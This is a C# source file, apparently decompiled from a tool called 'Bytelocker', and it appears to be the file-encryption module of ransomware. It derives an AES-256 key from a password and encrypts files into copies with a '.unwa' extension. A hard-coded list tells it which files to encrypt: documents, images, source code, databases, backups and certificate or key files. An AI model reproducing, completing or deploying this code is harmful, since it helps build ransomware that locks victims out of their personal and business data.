using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Bytelocker.CryptoManager;

internal class FileEncrypter : PasswordManager
{
	private const int AES_KEYSIZE = 256;

	private const int WRITE_BUFFER = 1048576;

	private const int AES_BLOCK_SIZE = 128;

	private const PaddingMode AES_PADDING_MODE = PaddingMode.PKCS7;

	private const CipherMode CIPHER_MODE = CipherMode.CFB;

	public static string FILE_EXTENSION_ENCRYPT_TMP = ".unwa";

	public static List<string> FILE_EXTENSIONS_TO_ENCRYPT = new List<string>
	{
		".3fr", ".lib", ".jfif", ".7z", ".js", ".7zip", ".apk", ".arw", ".asp", ".aspx",
		".avi", ".backup", ".bak", ".bat", ".c", ".cer", ".class", ".cpp", ".cr2", ".crt",
		".crw", ".cs", ".csproj", ".css", ".csv", ".db3", ".dbf", ".dcr", ".der", ".dng",
		".doc", ".docm", ".docx", ".dot", ".dotx", ".flv", ".gif", ".h", ".hpp", ".html",
		".ico", ".img", ".iso", ".jar", ".java", ".jpe", ".jpeg", ".jpg", ".litesql", ".lua",
		".m3u", ".mdb", ".mdf", ".mef", ".mid", ".mkv", ".mov", ".mp3", ".mp4", ".mpeg",
		".mpg", ".mrw", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt",
		".orf", ".p12", ".p7b", ".ai", ".p7c", ".pdd", ".pdf", ".pef", ".eps", ".pem",
		".pfx", ".php", ".pkg", ".plist", ".png", ".ppt", ".pptm", ".pptx", ".ps1", ".psd",
		".pst", ".ptx", ".py", ".pyc", ".r3d", ".raf", ".rar", ".raw", ".rb", ".rtf",
		".rw2", ".rwl", ".sg", ".sh", ".sln", ".sql", ".sqlite", ".sqlite3", ".sr2", ".srf",
		".srw", ".text", ".tif", ".tiff", ".tmp", ".txt", ".vb", ".vbs", ".vlf", ".vob",
		".wav", ".wb2", ".wmi", ".wmv", ".wpd", ".wps", ".x3f", ".xlk", ".xlm", ".xls",
		".xlsb", ".xlsm", ".xlsx", ".zip"
	};

	private string file_path;

	private byte[] salt;

	public void ChooseFile(string file_path)
	{
		this.file_path = file_path;
	}

	public void GenerateRandomSalt()
	{
		Aes aes = new Aes();
		salt = aes.GenerateRandomSalt();
	}

	public void Encrypt()
	{
		FileStream fileStream = new FileStream(file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(password), salt, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(salt, 0, salt.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(file_path, FileMode.Open);
		byte[] array = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array, 0, array.Length)) > 0)
			{
				cryptoStream.Write(array, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	public void Decrypt()
	{
		FileStream fileStream = new FileStream(file_path, FileMode.Open);
		fileStream.Read(salt, 0, salt.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(password), salt, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CFB;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);
		byte[] array = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array, 0, array.Length)) > 0)
			{
				fileStream2.Write(array, 0, count);
			}
			cryptoStream.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}
}
